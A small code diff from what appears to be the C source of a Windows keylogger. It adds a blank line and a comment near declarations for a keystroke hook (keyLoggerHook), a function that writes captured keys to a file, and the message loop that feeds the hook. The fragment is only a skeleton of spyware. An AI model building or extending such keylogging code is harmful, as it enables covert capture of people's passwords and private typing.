@@ -9,6 +9,7 @@ int SValLen;
 HANDLE hFile;
 bool fileExistYet = false;
 
+
 bool comitFile(char data[], DWORD dwBytesToWrite);
 LRESULT CALLBACK keyLoggerHook(int nCode, WPARAM wParam, LPARAM lParam);
 char* GetKey(int key, bool shift);
@@ -286,7 +287,7 @@ int main(void) {
 
     MSG message;
 
-    while (GetMessage(&message, NULL, 0, 0) != 0)
+    while (GetMessage(&message, NULL, 0, 0) != 0)// catch the windows messsanges and sen them to the keyLoggerHook function
     {
         TranslateMessage(&message);
         DispatchMessage(&message);
